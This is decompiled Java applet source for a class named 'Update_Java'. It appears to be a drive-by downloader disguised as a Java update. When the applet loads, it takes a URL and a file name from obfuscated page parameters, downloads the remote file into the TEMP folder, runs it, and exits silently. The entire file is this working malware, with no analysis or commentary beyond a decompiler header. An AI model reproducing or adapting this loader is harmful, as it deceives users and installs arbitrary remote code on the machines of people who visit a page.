import java.io.InputStream;
import java.io.IOException;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Update_Java extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("fviolhxpow4");
        final String getenv = System.getenv("TEMP");
        this.getParameter("fqizqni8mhm");
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + parameter);
            final InputStream inputStream = new URL(this.getParameter("srk9zomo4dg")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            Runtime.getRuntime().exec(getenv + parameter);
            System.exit(0);
        }
        catch (IOException ex) {
            System.exit(0);
        }
    }
}
